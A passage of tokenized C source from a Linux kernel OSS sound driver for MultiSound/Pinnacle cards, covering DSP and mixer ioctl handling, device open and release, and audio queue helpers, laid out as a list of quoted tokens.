"if", "(", "!(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", ")", "return", "-", "EINVAL", ";", "spin_lock_irqsave", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "abinfo", ".", "fragsize", "=", "dsp_get_frag_size", "(", ");", "abinfo", ".", "bytes", "=", "dev", ".", "DARF", ".", "n", "-", "dev", ".", "DARF", ".", "len", ";", "abinfo", ".", "fragstotal", "=", "dev", ".", "DARF", ".", "n", "/", "abinfo", ".", "fragsize", ";", "abinfo", ".", "fragments", "=", "abinfo", ".", "bytes", "/", "abinfo", ".", "fragsize", ";", "spin_unlock_irqrestore", "(", "&", "dev", ".", "lock", ",", "flags", ")", ";", "return", "copy_to_user", "(", "(", "void", "__user", "*", ")", "arg", ",", "&", "abinfo", ",", "sizeof", "(", "abinfo", ")", ")", "?", "-", "EFAULT", ":", "0", ";", "case", "SNDCTL_DSP_RESET", ":", "dev", ".", "nresets", "=", "0", ";", "reset_queues", "(", ");", "return", "0", ";", "case", "SNDCTL_DSP_SYNC", ":", "dsp_write_flush", "(", ");", "return", "0", ";", "case", "SNDCTL_DSP_GETBLKSIZE", ":", "tmp", "=", "dsp_get_frag_size", "(", ");", "if", "(", "put_user", "(", "tmp", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETFMTS", ":", "val", "=", "AFMT_S16_LE", "|", "AFMT_U8", ";", "if", "(", "put_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_SETFMT", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "data", "=", "val", "=", "=", "AFMT_QUERY", "?", "dev", ".", "play_sample_size", ":", "dsp_set_format", "(", "file", ",", "val", ")", ";", "else", "data", "=", "val", "=", "=", "AFMT_QUERY", "?", "dev", ".", "rec_sample_size", ":", "dsp_set_format", "(", "file", ",", "val", ")", ";", "if", "(", "put_user", "(", "data", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_NONBLOCK", ":", "if", "(", "!", "test_bit", "(", "F_DISABLE_WRITE_NDELAY", ",", "&", "dev", ".", "flags", ")", "&", "&", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "dev", ".", "play_ndelay", "=", "1", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "dev", ".", "rec_ndelay", "=", "1", ";", "return", "0", ";", "case", "SNDCTL_DSP_GETCAPS", ":", "val", "=", "DSP_CAP_DUPLEX", "|", "DSP_CAP_BATCH", ";", "if", "(", "put_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_SPEED", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "val", "<", "8000", ")", "val", "=", "8000", ";", "if", "(", "val", ">", "48000", ")", "val", "=", "48000", ";", "data", "=", "val", ";", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "+", "+", "i", ",", "lpDAQ", "+", "=", "DAQDS__size", ",", "lpDARQ", "+", "=", "DAQDS__size", ")", "{", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "writew", "(", "data", ",", "lpDAQ", "+", "DAQDS_wSampleRate", ")", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "writew", "(", "data", ",", "lpDARQ", "+", "DAQDS_wSampleRate", ")", ";", "}", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "dev", ".", "play_sample_rate", "=", "data", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "dev", ".", "rec_sample_rate", "=", "data", ";", "if", "(", "put_user", "(", "data", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "case", "SNDCTL_DSP_CHANNELS", ":", "case", "SNDCTL_DSP_STEREO", ":", "if", "(", "get_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "if", "(", "cmd", "=", "=", "SNDCTL_DSP_CHANNELS", ")", "{", "switch", "(", "val", ")", "{", "case", "1", ":", "case", "2", ":", "data", "=", "val", ";", "break", ";", "default", ":", "val", "=", "data", "=", "2", ";", "break", ";", "}", "}", "else", "{", "switch", "(", "val", ")", "{", "case", "0", ":", "data", "=", "1", ";", "break", ";", "default", ":", "val", "=", "1", ";", "case", "1", ":", "data", "=", "2", ";", "break", ";", "}", "}", "for", "(", "i", "=", "0", ";", "i", "<", "3", ";", "+", "+", "i", ",", "lpDAQ", "+", "=", "DAQDS__size", ",", "lpDARQ", "+", "=", "DAQDS__size", ")", "{", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "writew", "(", "data", ",", "lpDAQ", "+", "DAQDS_wChannels", ")", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "writew", "(", "data", ",", "lpDARQ", "+", "DAQDS_wChannels", ")", ";", "}", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "dev", ".", "play_channels", "=", "data", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "dev", ".", "rec_channels", "=", "data", ";", "if", "(", "put_user", "(", "val", ",", "p", ")", ")", "return", "-", "EFAULT", ";", "return", "0", ";", "}", "return", "-", "EINVAL", ";", "}", "static", "int", "mixer_get", "(", "int", "d", ")", "{", "if", "(", "d", ">", "31", ")", "return", "-", "EINVAL", ";", "switch", "(", "d", ")", "{", "case", "SOUND_MIXER_VOLUME", ":", "case", "SOUND_MIXER_PCM", ":", "case", "SOUND_MIXER_LINE", ":", "case", "SOUND_MIXER_IMIX", ":", "case", "SOUND_MIXER_LINE1", ":", "#", "ifndef", "MSND_CLASSIC", "case", "SOUND_MIXER_MIC", ":", "case", "SOUND_MIXER_SYNTH", ":", "#", "endif", "return", "(", "dev", ".", "left_levels", "[", "d", "]", ">", ">", "8", ")", "*", "100", "/", "0xff", "|", "(", "((", "dev", ".", "right_levels", "[", "d", "]", ">", ">", "8", ")", "*", "100", "/", "0xff", ")", "<", "<", "8", ")", ";", "default", ":", "return", "0", ";", "}", "}", "#", "define", "update_volm", "(", "a", ",", "b", ")", "\\", "writew", "(", "(", "dev", ".", "left_levels", "[", "a", "]", ">", ">", "1", ")", "*", "\\", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolLeft", ")", "/", "0xffff", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "b", "#", "#", "Left", ")", ";", "\\", "writew", "(", "(", "dev", ".", "right_levels", "[", "a", "]", ">", ">", "1", ")", "*", "\\", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolRight", ")", "/", "0xffff", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "b", "#", "#", "Right", ")", ";", "#", "define", "update_potm", "(", "d", ",", "s", ",", "ar", ")", "\\", "writeb", "(", "(", "dev", ".", "left_levels", "[", "d", "]", ">", ">", "8", ")", "*", "\\", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolLeft", ")", "/", "0xffff", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "s", "#", "#", "Left", ")", ";", "\\", "writeb", "(", "(", "dev", ".", "right_levels", "[", "d", "]", ">", ">", "8", ")", "*", "\\", "readw", "(", "dev", ".", "SMA", "+", "SMA_wCurrMastVolRight", ")", "/", "0xffff", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "s", "#", "#", "Right", ")", ";", "\\", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "ar", ")", "=", "=", "0", ")", "\\", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "#", "define", "update_pot", "(", "d", ",", "s", ",", "ar", ")", "\\", "writeb", "(", "dev", ".", "left_levels", "[", "d", "]", ">", ">", "8", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "s", "#", "#", "Left", ")", ";", "\\", "writeb", "(", "dev", ".", "right_levels", "[", "d", "]", ">", ">", "8", ",", "\\", "dev", ".", "SMA", "+", "SMA_", "#", "#", "s", "#", "#", "Right", ")", ";", "\\", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "ar", ")", "=", "=", "0", ")", "\\", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "static", "int", "mixer_set", "(", "int", "d", ",", "int", "value", ")", "{", "int", "left", "=", "value", "&", "0x000000ff", ";", "int", "right", "=", "(", "value", "&", "0x0000ff00", ")", ">", ">", "8", ";", "int", "bLeft", ",", "bRight", ";", "int", "wLeft", ",", "wRight", ";", "int", "updatemaster", "=", "0", ";", "if", "(", "d", ">", "31", ")", "return", "-", "EINVAL", ";", "bLeft", "=", "left", "*", "0xff", "/", "100", ";", "wLeft", "=", "left", "*", "0xffff", "/", "100", ";", "bRight", "=", "right", "*", "0xff", "/", "100", ";", "wRight", "=", "right", "*", "0xffff", "/", "100", ";", "dev", ".", "left_levels", "[", "d", "]", "=", "wLeft", ";", "dev", ".", "right_levels", "[", "d", "]", "=", "wRight", ";", "switch", "(", "d", ")", "{", "/", "*", "master", "volume", "unscaled", "controls", "*", "/", "case", "SOUND_MIXER_LINE", ":", "/", "*", "line", "pot", "control", "*", "/", "/", "*", "scaled", "by", "IMIX", "in", "digital", "mix", "*", "/", "writeb", "(", "bLeft", ",", "dev", ".", "SMA", "+", "SMA_bInPotPosLeft", ")", ";", "writeb", "(", "bRight", ",", "dev", ".", "SMA", "+", "SMA_bInPotPosRight", ")", ";", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_IN_SET_POTS", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "break", ";", "#", "ifndef", "MSND_CLASSIC", "case", "SOUND_MIXER_MIC", ":", "/", "*", "mic", "pot", "control", "*", "/", "/", "*", "scaled", "by", "IMIX", "in", "digital", "mix", "*", "/", "writeb", "(", "bLeft", ",", "dev", ".", "SMA", "+", "SMA_bMicPotPosLeft", ")", ";", "writeb", "(", "bRight", ",", "dev", ".", "SMA", "+", "SMA_bMicPotPosRight", ")", ";", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_MIC_SET_POTS", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "break", ";", "#", "endif", "case", "SOUND_MIXER_VOLUME", ":", "/", "*", "master", "volume", "*", "/", "writew", "(", "wLeft", ",", "dev", ".", "SMA", "+", "SMA_wCurrMastVolLeft", ")", ";", "writew", "(", "wRight", ",", "dev", ".", "SMA", "+", "SMA_wCurrMastVolRight", ")", ";", "/", "*", "fall", "through", "*", "/", "case", "SOUND_MIXER_LINE1", ":", "/", "*", "aux", "pot", "control", "*", "/", "/", "*", "scaled", "by", "master", "volume", "*", "/", "/", "*", "fall", "through", "*", "/", "/", "*", "digital", "controls", "*", "/", "case", "SOUND_MIXER_SYNTH", ":", "/", "*", "synth", "vol", "(", "dsp", "mix", ")", "*", "/", "case", "SOUND_MIXER_PCM", ":", "/", "*", "pcm", "vol", "(", "dsp", "mix", ")", "*", "/", "case", "SOUND_MIXER_IMIX", ":", "/", "*", "input", "monitor", "(", "dsp", "mix", ")", "*", "/", "/", "*", "scaled", "by", "master", "volume", "*", "/", "updatemaster", "=", "1", ";", "break", ";", "default", ":", "return", "0", ";", "}", "if", "(", "updatemaster", ")", "{", "/", "*", "update", "master", "volume", "scaled", "controls", "*", "/", "update_volm", "(", "SOUND_MIXER_PCM", ",", "wCurrPlayVol", ")", ";", "update_volm", "(", "SOUND_MIXER_IMIX", ",", "wCurrInVol", ")", ";", "#", "ifndef", "MSND_CLASSIC", "update_volm", "(", "SOUND_MIXER_SYNTH", ",", "wCurrMHdrVol", ")", ";", "#", "endif", "update_potm", "(", "SOUND_MIXER_LINE1", ",", "bAuxPotPos", ",", "HDEXAR_AUX_SET_POTS", ")", ";", "}", "return", "mixer_get", "(", "d", ")", ";", "}", "static", "void", "mixer_setup", "(", "void", ")", "{", "update_pot", "(", "SOUND_MIXER_LINE", ",", "bInPotPos", ",", "HDEXAR_IN_SET_POTS", ")", ";", "update_potm", "(", "SOUND_MIXER_LINE1", ",", "bAuxPotPos", ",", "HDEXAR_AUX_SET_POTS", ")", ";", "update_volm", "(", "SOUND_MIXER_PCM", ",", "wCurrPlayVol", ")", ";", "update_volm", "(", "SOUND_MIXER_IMIX", ",", "wCurrInVol", ")", ";", "#", "ifndef", "MSND_CLASSIC", "update_pot", "(", "SOUND_MIXER_MIC", ",", "bMicPotPos", ",", "HDEXAR_MIC_SET_POTS", ")", ";", "update_volm", "(", "SOUND_MIXER_SYNTH", ",", "wCurrMHdrVol", ")", ";", "#", "endif", "}", "static", "unsigned", "long", "set_recsrc", "(", "unsigned", "long", "recsrc", ")", "{", "if", "(", "dev", ".", "recsrc", "=", "=", "recsrc", ")", "return", "dev", ".", "recsrc", ";", "#", "ifdef", "HAVE_NORECSRC", "else", "if", "(", "recsrc", "=", "=", "0", ")", "dev", ".", "recsrc", "=", "0", ";", "#", "endif", "else", "dev", ".", "recsrc", "^", "=", "recsrc", ";", "#", "ifndef", "MSND_CLASSIC", "if", "(", "dev", ".", "recsrc", "&", "SOUND_MASK_IMIX", ")", "{", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_SET_ANA_IN", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "}", "else", "if", "(", "dev", ".", "recsrc", "&", "SOUND_MASK_SYNTH", ")", "{", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_SET_SYNTH_IN", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "}", "else", "if", "(", "(", "dev", ".", "recsrc", "&", "SOUND_MASK_DIGITAL1", ")", "&", "&", "test_bit", "(", "F_HAVEDIGITAL", ",", "&", "dev", ".", "flags", ")", ")", "{", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_SET_DAT_IN", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "}", "else", "{", "#", "ifdef", "HAVE_NORECSRC", "/", "*", "Select", "no", "input", "(", "?)", "*", "/", "dev", ".", "recsrc", "=", "0", ";", "#", "else", "dev", ".", "recsrc", "=", "SOUND_MASK_IMIX", ";", "if", "(", "msnd_send_word", "(", "&", "dev", ",", "0", ",", "0", ",", "HDEXAR_SET_ANA_IN", ")", "=", "=", "0", ")", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_AUX_REQ", ")", ";", "#", "endif", "}", "#", "endif", "/", "*", "MSND_CLASSIC", "*", "/", "return", "dev", ".", "recsrc", ";", "}", "static", "unsigned", "long", "force_recsrc", "(", "unsigned", "long", "recsrc", ")", "{", "dev", ".", "recsrc", "=", "0", ";", "return", "set_recsrc", "(", "recsrc", ")", ";", "}", "#", "define", "set_mixer_info", "(", ")", "\\", "memset", "(", "&", "info", ",", "0", ",", "sizeof", "(", "info", ")", ");", "\\", "strlcpy", "(", "info", ".", "id", ",", "\"", "MSNDMIXER", "\"", ",", "sizeof", "(", "info", ".", "id", ")", ");", "\\", "strlcpy", "(", "info", ".", "name", ",", "\"", "MultiSound", "Mixer", "\"", ",", "sizeof", "(", "info", ".", "name", ")", ");", "static", "int", "mixer_ioctl", "(", "unsigned", "int", "cmd", ",", "unsigned", "long", "arg", ")", "{", "if", "(", "cmd", "=", "=", "SOUND_MIXER_INFO", ")", "{", "mixer_info", "info", ";", "set_mixer_info", "(", ");", "info", ".", "modify_counter", "=", "dev", ".", "mixer_mod_count", ";", "if", "(", "copy_to_user", "(", "(", "void", "__user", "*", ")", "arg", ",", "&", "info", ",", "sizeof", "(", "info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "}", "else", "if", "(", "cmd", "=", "=", "SOUND_OLD_MIXER_INFO", ")", "{", "_old_mixer_info", "info", ";", "set_mixer_info", "(", ");", "if", "(", "copy_to_user", "(", "(", "void", "__user", "*", ")", "arg", ",", "&", "info", ",", "sizeof", "(", "info", ")", "))", "return", "-", "EFAULT", ";", "return", "0", ";", "}", "else", "if", "(", "cmd", "=", "=", "SOUND_MIXER_PRIVATE1", ")", "{", "dev", ".", "nresets", "=", "0", ";", "dsp_full_reset", "(", ");", "return", "0", ";", "}", "else", "if", "(", "((", "cmd", ">", ">", "8", ")", "&", "0xff", ")", "=", "=", "'", "M", "'", ")", "{", "int", "val", "=", "0", ";", "if", "(", "_SIOC_DIR", "(", "cmd", ")", "&", "_SIOC_WRITE", ")", "{", "switch", "(", "cmd", "&", "0xff", ")", "{", "case", "SOUND_MIXER_RECSRC", ":", "if", "(", "get_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "val", "=", "set_recsrc", "(", "val", ")", ";", "break", ";", "default", ":", "if", "(", "get_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ")", "return", "-", "EFAULT", ";", "val", "=", "mixer_set", "(", "cmd", "&", "0xff", ",", "val", ")", ";", "break", ";", "}", "+", "+", "dev", ".", "mixer_mod_count", ";", "return", "put_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ";", "}", "else", "{", "switch", "(", "cmd", "&", "0xff", ")", "{", "case", "SOUND_MIXER_RECSRC", ":", "val", "=", "dev", ".", "recsrc", ";", "break", ";", "case", "SOUND_MIXER_DEVMASK", ":", "case", "SOUND_MIXER_STEREODEVS", ":", "val", "=", "SOUND_MASK_PCM", "|", "SOUND_MASK_LINE", "|", "SOUND_MASK_IMIX", "|", "SOUND_MASK_LINE1", "|", "#", "ifndef", "MSND_CLASSIC", "SOUND_MASK_MIC", "|", "SOUND_MASK_SYNTH", "|", "#", "endif", "SOUND_MASK_VOLUME", ";", "break", ";", "case", "SOUND_MIXER_RECMASK", ":", "#", "ifdef", "MSND_CLASSIC", "val", "=", "0", ";", "#", "else", "val", "=", "SOUND_MASK_IMIX", "|", "SOUND_MASK_SYNTH", ";", "if", "(", "test_bit", "(", "F_HAVEDIGITAL", ",", "&", "dev", ".", "flags", ")", ")", "val", "|", "=", "SOUND_MASK_DIGITAL1", ";", "#", "endif", "break", ";", "case", "SOUND_MIXER_CAPS", ":", "val", "=", "SOUND_CAP_EXCL_INPUT", ";", "break", ";", "default", ":", "if", "(", "(", "val", "=", "mixer_get", "(", "cmd", "&", "0xff", ")", ")", "<", "0", ")", "return", "-", "EINVAL", ";", "break", ";", "}", "}", "return", "put_user", "(", "val", ",", "(", "int", "__user", "*", ")", "arg", ")", ";", "}", "return", "-", "EINVAL", ";", "}", "static", "long", "dev_ioctl", "(", "struct", "file", "*", "file", ",", "unsigned", "int", "cmd", ",", "unsigned", "long", "arg", ")", "{", "int", "minor", "=", "iminor", "(", "file_inode", "(", "file", ")", ");", "int", "ret", ";", "if", "(", "cmd", "=", "=", "OSS_GETVERSION", ")", "{", "int", "sound_version", "=", "SOUND_VERSION", ";", "return", "put_user", "(", "sound_version", ",", "(", "int", "__user", "*", ")", "arg", ")", ";", "}", "ret", "=", "-", "EINVAL", ";", "mutex_lock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "if", "(", "minor", "=", "=", "dev", ".", "dsp_minor", ")", "ret", "=", "dsp_ioctl", "(", "file", ",", "cmd", ",", "arg", ")", ";", "else", "if", "(", "minor", "=", "=", "dev", ".", "mixer_minor", ")", "ret", "=", "mixer_ioctl", "(", "cmd", ",", "arg", ")", ";", "mutex_unlock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "return", "ret", ";", "}", "static", "void", "dsp_write_flush", "(", "void", ")", "{", "int", "timeout", "=", "get_play_delay_jiffies", "(", "dev", ".", "DAPF", ".", "len", ")", ";", "if", "(", "!(", "dev", ".", "mode", "&", "FMODE_WRITE", ")", "|", "|", "!", "test_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ")", "return", ";", "set_bit", "(", "F_WRITEFLUSH", ",", "&", "dev", ".", "flags", ")", ";", "wait_event_interruptible_timeout", "(", "dev", ".", "writeflush", ",", "!", "test_bit", "(", "F_WRITEFLUSH", ",", "&", "dev", ".", "flags", ")", ",", "timeout", ")", ";", "clear_bit", "(", "F_WRITEFLUSH", ",", "&", "dev", ".", "flags", ")", ";", "if", "(", "!", "signal_pending", "(", "current", ")", ")", "{", "__set_current_state", "(", "TASK_INTERRUPTIBLE", ")", ";", "schedule_timeout", "(", "get_play_delay_jiffies", "(", "DAP_BUFF_SIZE", ")", ");", "}", "clear_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ";", "}", "static", "void", "dsp_halt", "(", "struct", "file", "*", "file", ")", "{", "if", "(", "(", "file", "?", "file", "-", ">", "f_mode", ":", "dev", ".", "mode", ")", "&", "FMODE_READ", ")", "{", "clear_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", ";", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_RECORD_STOP", ")", ";", "msnd_disable_irq", "(", "&", "dev", ")", ";", "if", "(", "file", ")", "{", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Stopping", "read", "for", "%", "p", "\\", "n", "\"", ",", "file", ")", ";", "dev", ".", "mode", "&", "=", "~", "FMODE_READ", ";", "}", "clear_bit", "(", "F_AUDIO_READ_INUSE", ",", "&", "dev", ".", "flags", ")", ";", "}", "if", "(", "(", "file", "?", "file", "-", ">", "f_mode", ":", "dev", ".", "mode", ")", "&", "FMODE_WRITE", ")", "{", "if", "(", "test_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ")", "{", "dsp_write_flush", "(", ");", "chk_send_dsp_cmd", "(", "&", "dev", ",", "HDEX_PLAY_STOP", ")", ";", "}", "msnd_disable_irq", "(", "&", "dev", ")", ";", "if", "(", "file", ")", "{", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Stopping", "write", "for", "%", "p", "\\", "n", "\"", ",", "file", ")", ";", "dev", ".", "mode", "&", "=", "~", "FMODE_WRITE", ";", "}", "clear_bit", "(", "F_AUDIO_WRITE_INUSE", ",", "&", "dev", ".", "flags", ")", ";", "}", "}", "static", "int", "dsp_release", "(", "struct", "file", "*", "file", ")", "{", "dsp_halt", "(", "file", ")", ";", "return", "0", ";", "}", "static", "int", "dsp_open", "(", "struct", "file", "*", "file", ")", "{", "if", "(", "(", "file", "?", "file", "-", ">", "f_mode", ":", "dev", ".", "mode", ")", "&", "FMODE_WRITE", ")", "{", "set_bit", "(", "F_AUDIO_WRITE_INUSE", ",", "&", "dev", ".", "flags", ")", ";", "clear_bit", "(", "F_WRITING", ",", "&", "dev", ".", "flags", ")", ";", "msnd_fifo_make_empty", "(", "&", "dev", ".", "DAPF", ")", ";", "reset_play_queue", "(", ");", "if", "(", "file", ")", "{", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Starting", "write", "for", "%", "p", "\\", "n", "\"", ",", "file", ")", ";", "dev", ".", "mode", "|", "=", "FMODE_WRITE", ";", "}", "msnd_enable_irq", "(", "&", "dev", ")", ";", "}", "if", "(", "(", "file", "?", "file", "-", ">", "f_mode", ":", "dev", ".", "mode", ")", "&", "FMODE_READ", ")", "{", "set_bit", "(", "F_AUDIO_READ_INUSE", ",", "&", "dev", ".", "flags", ")", ";", "clear_bit", "(", "F_READING", ",", "&", "dev", ".", "flags", ")", ";", "msnd_fifo_make_empty", "(", "&", "dev", ".", "DARF", ")", ";", "reset_record_queue", "(", ");", "if", "(", "file", ")", "{", "printk", "(", "KERN_DEBUG", "LOGNAME", "\"", ":", "Starting", "read", "for", "%", "p", "\\", "n", "\"", ",", "file", ")", ";", "dev", ".", "mode", "|", "=", "FMODE_READ", ";", "}", "msnd_enable_irq", "(", "&", "dev", ")", ";", "}", "return", "0", ";", "}", "static", "void", "set_default_play_audio_parameters", "(", "void", ")", "{", "dev", ".", "play_sample_size", "=", "DEFSAMPLESIZE", ";", "dev", ".", "play_sample_rate", "=", "DEFSAMPLERATE", ";", "dev", ".", "play_channels", "=", "DEFCHANNELS", ";", "}", "static", "void", "set_default_rec_audio_parameters", "(", "void", ")", "{", "dev", ".", "rec_sample_size", "=", "DEFSAMPLESIZE", ";", "dev", ".", "rec_sample_rate", "=", "DEFSAMPLERATE", ";", "dev", ".", "rec_channels", "=", "DEFCHANNELS", ";", "}", "static", "void", "set_default_audio_parameters", "(", "void", ")", "{", "set_default_play_audio_parameters", "(", ");", "set_default_rec_audio_parameters", "(", ");", "}", "static", "int", "dev_open", "(", "struct", "inode", "*", "inode", ",", "struct", "file", "*", "file", ")", "{", "int", "minor", "=", "iminor", "(", "inode", ")", ";", "int", "err", "=", "0", ";", "mutex_lock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "if", "(", "minor", "=", "=", "dev", ".", "dsp_minor", ")", "{", "if", "(", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", "&", "&", "test_bit", "(", "F_AUDIO_WRITE_INUSE", ",", "&", "dev", ".", "flags", ")", ")", "|", "|", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", "&", "&", "test_bit", "(", "F_AUDIO_READ_INUSE", ",", "&", "dev", ".", "flags", ")", "))", "{", "err", "=", "-", "EBUSY", ";", "goto", "out", ";", "}", "if", "(", "(", "err", "=", "dsp_open", "(", "file", ")", ")", ">", "=", "0", ")", "{", "dev", ".", "nresets", "=", "0", ";", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_WRITE", ")", "{", "set_default_play_audio_parameters", "(", ");", "if", "(", "!", "test_bit", "(", "F_DISABLE_WRITE_NDELAY", ",", "&", "dev", ".", "flags", ")", ")", "dev", ".", "play_ndelay", "=", "(", "file", "-", ">", "f_flags", "&", "O_NDELAY", ")", "?", "1", ":", "0", ";", "else", "dev", ".", "play_ndelay", "=", "0", ";", "}", "if", "(", "file", "-", ">", "f_mode", "&", "FMODE_READ", ")", "{", "set_default_rec_audio_parameters", "(", ");", "dev", ".", "rec_ndelay", "=", "(", "file", "-", ">", "f_flags", "&", "O_NDELAY", ")", "?", "1", ":", "0", ";", "}", "}", "}", "else", "if", "(", "minor", "=", "=", "dev", ".", "mixer_minor", ")", "{", "/", "*", "nothing", "*", "/", "}", "else", "err", "=", "-", "EINVAL", ";", "out", ":", "mutex_unlock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "return", "err", ";", "}", "static", "int", "dev_release", "(", "struct", "inode", "*", "inode", ",", "struct", "file", "*", "file", ")", "{", "int", "minor", "=", "iminor", "(", "inode", ")", ";", "int", "err", "=", "0", ";", "mutex_lock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "if", "(", "minor", "=", "=", "dev", ".", "dsp_minor", ")", "err", "=", "dsp_release", "(", "file", ")", ";", "else", "if", "(", "minor", "=", "=", "dev", ".", "mixer_minor", ")", "{", "/", "*", "nothing", "*", "/", "}", "else", "err", "=", "-", "EINVAL", ";", "mutex_unlock", "(", "&", "msnd_pinnacle_mutex", ")", ";", "return", "err", ";", "}", "static", "__inline__", "int", "pack_DARQ_to_DARF", "(", "register", "int", "bank", ")", "{", "register", "int", "size", ",", "timeout", "=", "3", ";", "register", "WORD", "wTmp", ";", "LPDAQD", "DAQD", ";", "/", "*", "Increment", "the", "tail", "and", "check", "for", "queue", "wrap", "*", "/", "wTmp", "=", "readw", "(", "dev", ".", "DARQ", "+", "JQS_wTail", ")", "+", "PCTODSP_OFFSET", "(", "DAQDS__size", ")", ";", "if", "(", "wTmp", ">", "readw", "(", "dev", ".", "DARQ", "+", "JQS_wSize", ")", ")", "wTmp", "=", "0", ";", "while", "(", "wTmp", "=", "=", "readw", "(", "dev", ".", "DARQ", "+", "JQS_wHead", ")", "&", "&", "timeout", "-", "-)", "udelay", "(", "1", ")", ";", "writew", "(", "wTmp", ",", "dev", ".", "DARQ", "+", "JQS_wTail", ")", ";", "/", "*", "Get", "our", "digital", "audio", "queue", "struct", "*", "/", "DAQD", "=", "bank", "*", "DAQDS__size", "+", "dev", ".", "base", "+", "DARQ_DATA_BUFF", ";", "/", "*", "Get", "length", "of", "data", "*", "/", "size", "=", "readw", "(", "DAQD", "+", "DAQDS_wSize", ")", ";", "/", "*", "Read", "data", "from", "the", "head", "(", "unprotected", "bank", "1", "access", "okay", "since", "this", "is", "only", "called", "inside", "an", "interrupt", ")", "*", "/", "msnd_outb", "(", "HPBLKSEL_1", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "msnd_fifo_write_io", "(", "&", "dev", ".", "DARF", ",", "dev", ".", "base", "+", "bank", "*", "DAR_BUFF_SIZE", ",", "size", ")", ";", "msnd_outb", "(", "HPBLKSEL_0", ",", "dev", ".", "io", "+", "HP_BLKS", ")", ";", "return", "1", ";", "}", "static", "__inline__", "int", "pack_DAPF_to_DAPQ", "(", "register", "int", "start", ")", "{", "register", "WORD", "DAPQ_tail", ";", "register", "int", "protect", "=", "start", ",", "nbanks", "=", "0", ";", "LPDAQD", "DAQD", ";", "DAPQ_tail", "=", "readw", "(", "dev", ".", "DAPQ", "+", "JQS_wTail", ")", ";", "while", "(", 